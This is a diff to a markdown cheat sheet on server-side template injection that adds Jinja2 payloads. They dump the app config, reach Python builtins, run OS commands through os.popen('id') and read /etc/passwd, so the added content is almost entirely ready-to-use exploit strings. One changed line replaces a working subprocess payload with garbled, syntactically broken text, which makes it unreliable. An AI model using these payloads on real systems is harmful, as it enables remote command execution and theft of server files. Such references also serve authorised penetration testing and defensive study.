@@ -3,7 +3,7 @@
 ## Universal polyglot
 
 ```
-${{\<\%\[%'"}}%\\
+${{<\%\[%'"}}%\\
 ```
 
 ## Testing Methodology
@@ -47,9 +47,22 @@ Detect:
 RCE:
 
 ```
+{{ config.items() }}
+{{ self.__init__.__globals__.__builtins__ }}
+```
+
+```
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{ ''.__class__.__mro__[1].__subclasses__() }}  → find subprocess.Popen index
-{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
+{{ ''.__class__.__mro__[[)[INDEX]('id',shell=True,stdout=-1|1]].communicate() }}
+```
+
+LFI
+
+```
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
 ### Twig (PHP — Symfony)
